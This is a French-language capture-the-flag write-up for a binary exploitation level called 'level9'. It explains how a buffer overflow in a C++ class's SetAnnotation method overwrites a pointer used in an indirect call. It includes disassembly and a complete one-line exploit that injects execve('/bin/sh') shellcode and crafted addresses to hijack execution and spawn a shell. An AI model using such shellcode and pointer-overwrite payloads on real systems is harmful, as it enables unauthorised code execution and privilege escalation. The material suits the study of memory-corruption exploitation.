@@ -1,0 +1,29 @@
+Pour ce level, la difficultee vient du fait que le code source est ecris en c++
+et non en c. Ce qui introduit la decompilation de classe, lorsqu'on regarde dans
+le code asm, on voit une certaine partie interressante:
+
+804867c:   8b 44 24 10             mov    0x10(%esp),%eax
+8048680:   8b 00                   mov    (%eax),%eax
+8048682:   8b 10                   mov    (%eax),%edx
+8048684:   8b 44 24 14             mov    0x14(%esp),%eax
+8048688:   89 44 24 04             mov    %eax,0x4(%esp)
+804868c:   8b 44 24 10             mov    0x10(%esp),%eax
+8048690:   89 04 24                mov    %eax,(%esp)
+8048693:   ff d2                   call   *%edx
+
+cette partie, va en fait chercher un pointeur qui se trouve dans un classe appellee
+N et va ensuite faire un call sur l'adresse que l'on obtient en prenant ce que
+pointe l'adresse qui a ete pointe par la variable de la classe dont je parlais.
+Seulement, cette variable n'est pas protegee et on peut y acceder via le buffer
+qui se trouve juste avant. Dans le main on appelle la fonction SetAnnotation de
+la classe N qui rempli le fameux buffer, donc en faisant une sorte de buffer
+overflow on peut controller notre deuxieme variable. On va en plus ecrire un shellcode
+qui nous permet de lancer un shell dans notre buffer(qui fait 108 charactere soit
+disant passant). Notre payload va donc faire un call sur l'adresse de notre buffer
+ou se situra le shellcode:
+
+./level9 `python -c 'print   "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0c\xa0\x04\x08" +"A"*83 + "\x21\xa0\x04\x08"'`
+                              adr1                                                                                     adr2                         adr3
+
+ici, le shellcode se trouve a adr1, l'adr3 rempli la variable a exploiter et
+pointe vers l'adr2 qui elle pointe vers l'adr1
